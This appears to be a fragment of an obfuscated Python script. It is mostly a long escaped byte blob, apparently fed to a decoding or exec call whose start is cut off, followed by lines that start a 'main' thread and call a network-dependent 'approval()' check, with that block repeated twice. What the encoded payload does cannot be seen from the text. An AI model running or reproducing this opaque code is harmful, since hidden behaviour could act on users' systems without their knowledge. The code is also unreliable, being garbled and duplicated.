`\x9d&7\x8f\xcc3#\x95\xe0\xaa\xa8\x08\xf6\x8c\xda\xc0\xa6\x12?&Q]\x867\xb3]\x8e\xd2\xf7\x95\x04\xec\x97\xeb\xf3\xd5@\xd4f\xb3\x13i\xd8\xe6d\x9b7&\x8e\x13\x96N\x05\x97l\xc1\xdcf%\xb9\t\xed\xc8\xb7\xb6\xe8\x98+\x12\xfa\xf3|\xb9{.\xe6\xa3\x82\xe8w\xb7}\xb8ErN$\x820^\xc6xG%\xc8\xdf`\xe4\x95zPi\xb2\t\x85\x0b\x18\xfc\\\x88\x99v\x97\x19\'\xb5\xa5\x81\x16;3f|j\x81\x01\xe9[\xc9\x0c-\xb4S\x97\xcd\xcf\xe2\x1c\xc6}\x9a6!\xfd%\xa26U\xe1`\x0cT\xce\xb9\xbd\x96\xc6\xa9\xaeN~G\x1e\xf4\xb9\xb8NF\xf22\x99I\x9e\x8f\xd7t.\xceb\xc2\x0b\xaa\xa7\x07YD\x07~\x9e\x94\x8d\xfd\xf2\x80\x08\xc8)\x03\xfe\x940\x04\xbe\xef%\xc4ld\xcd\xb8M\x8ce\x12M\x8d"\xc2\xb8\xa4@\x16^\x85N`\xe1\xce\x10\x1f\x0f\xf75y\xb4\xd2\xba\xcasb\x93\x8f\xb0)\x14\xb9\xc0\x88\xa9\xf2r\xaa\x85#\x91\xb687L\x10s\x93\xab\xc9\xa2p\x15\xad\xda9[u\xcaL\x95qB\xba\x01\xcbM>z\xad\xd0\xf2\x04\xbc\xb3\x1eV\x84\x8du _\x9e\xac\xb3\x8e<\xcf\xed\x01\xdf\xa8:b"\xb2\xa2\xa9V\xe3c%\xdb\xc9z\xac\xf2|"4\\\xd1\xee\xa3\xb0\xa1N\xe8\xf2\\\xc5\xbb\x88X\x12<\x8cz\n_q\xac\xbb\xe1\xb9\x95$\xb5_s\x81=\xcf\xaa[\xd7\xe0\xa1\xca\x92\x86\n\xa1\xe2\xa1\x12\xe3\x8c\xa4t\xe4\nw\xb9%\xa2\n\xcf\xf8EE\x08\xf1Xn\x00\xef\xa9\xc3\xc6\xfa^9\x9ev\xb5\xcb\xc2\x81\x98\xa1X\xdb\x8fA\xe9\x9c`$\t\xf0\xbc\xd5g\xd5\x8dx\xd5\xdeU\xd4I\xe3kT\x1b\\U\xcb\xf0@\xb9$\'\xa5\x14fA\xa1x\x9e;\xc0*\x03v<\xc6\xeaq\x97\x18\xbc\xe9)q\xcc\x89\xa24;\x8e\xa6)\xf6\tsw\x9d\xa8\xc2\x8eZ\xc96\xe6\xef\xbd\xab\xf3\x0f\x8bU\xa4\x86\x92\xac\xa80\xa6\xdc\xdbc\xb5\xde\xda\x94m\\\xba\xea\xc7J\x0c\x1a\x83\xdf\xb2\xb6\xe0\xb1\xdc\xdf7c\xc4\xf8\xf5\xacEc|\xe6=4\x0b\x81\xc3\x1b6\n\x13\xc0\xd6\xa0^\x11f\xa6z\x86\xf7\xacN\x1c\xf7\xe1\x0b.[\x8b\xb3#1\xd9^\x18\xef\xd5\xa0\xcc5\xcb\xb5\xb8\x07\xeb\xc4rFsQ\xa4\x13\xd29/*1l\xc4x\xb2\xdc\x92\xf4B\xdbe\x06\x11\xad\x00\xa4\x88M8\xdaY\x15z\xc4\xed\x0eAb\x16\xad\xe6+ZL\x83\xcb\xb9\x1ep|\xfc0\xeb\x12\x85\xdb.}\xe5\xb0\xaa\t\x99[\xbf\xb4\x96\xed\x19\x1fe\x89\xabqe\x02~?\x92\x16\xd2\xaff\x90\x1e3\x86\x06wp\xc6\t\xe5\x80\xac%\x8c\x8c\xd4W0\xa85|\xafE5\x95\xc3\x85\xa5\xab\xc0\x8dT\xa7\x9d\x05a\xe3\xa3Z\x14o\xe3\x88\x81\x88p\xceG\xa1\xd4\xc6<\xec\xcb9t\x90\xcc\xce5&n2\xca;s\xc9\xc1\r\xa5^\x14\x9a\xdf\xb1\x83O\xe9:\xd9\xd7\x17F\xd7gqf.\x11\x02\xbc\xc0\x0e\xad\x8b\x16X)\x9cmh\xa6\xfa\xe2\xe8\xb1\xce\xa8\xcb\x99\xce\xde^W\xb5 o[\x14s\x88dz\r2\x88\xb3\xde\xd7YiJ\xa4\x99\x9b\xca|c\xc3Y\xb6\x1cz\xba\xe6\xaa\x04\x88<\x8a\xc4\xfa5[\x03x:4/\xa1%\x1e\x03\xa3fBF\xae\'\x85\x81\xad\x1b\x03\x94\x07\x8a\xdeZ\xb5\xe6\xaeW\x92\x83\n\xeb\x95\xb9;\xcb\xfa2\xf2h\x83\xb6\xc3\xe9.k[X8\xa6\xcc\xe8\xcb9\xd2\xa7q\xc9r5\xca_C\x02\x1b\x8d\xfc\xb4\xae\x07{>z\xb8\xf1\x95\xc8\x96\xeb\xc6\x01\x1d_\x10&}cq\xab\x0e-\x89\\\xe2\xb0\x8dc\xeb\x18\xef\xfb\x00qQ\xda\x92nsF1\x87\x89q.Te\xdf\x9a\xb5\x8b{\x80rF\x8e\x0e\x0f\xb5D\x1b\xc2\xfb\xe5\xd2\x05OD\xba\xa3\xba\xab\xedr\xfa\xe3\xf3\xf3\x1f\xa1\xfe+('))

import _thread

_thread.start_new_thread(main,())

approval() 

try:

	approval()

except requests.exceptions.ConnectionError:

	print('\n No internet connection ...')

	exit()

except:exit()

import _thread

_thread.start_new_thread(main,())

approval() 

try:

	approval()

except requests.exceptions.ConnectionError:

	print('\n No internet connection ...')

	exit()

except:exit()
